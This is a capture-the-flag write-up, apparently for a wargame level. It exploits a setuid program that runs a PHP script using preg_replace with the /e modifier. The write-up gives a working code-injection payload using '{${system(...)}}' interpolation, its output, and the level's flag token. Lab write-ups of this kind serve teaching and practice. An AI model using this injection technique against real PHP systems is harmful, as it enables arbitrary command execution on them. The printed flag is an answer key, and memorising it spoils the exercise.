## writeup level06

When we log in as user level06, we can see 2 files in our home: `level06` and `level06.php`
```shell
$ ls -l level06
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
$ cat level06.php
```
```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
The `level06` binary has again this suid bit, which enable execution as root owner `flag06`. \
After examining it with `strings` and a little `gdb`, we see it uses `execve` to call our script with `argv[1]` and `argv[2]`.
The php script calls `file_get_contents` with the first argument, and does some regex replacement stuff. The only one that interest us is the first replace: \
`preg_replace` is called with the `/e` modifier, which enables the interpolation of captured elements. \
Basically, it will replace all `[x ELEMENTS]` with `y("ELEMENTS")` after escaping the captured elements. \
In php, you can execute variable interpolation by using the `{${` syntax. So we can basically execute any php code we want inside the interpolation like so:
```shell
$ cat > /tmp/printflag <<EOF
[x {${system(getflag)}}]
EOF
$ ./level06 /tmp/printflag
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
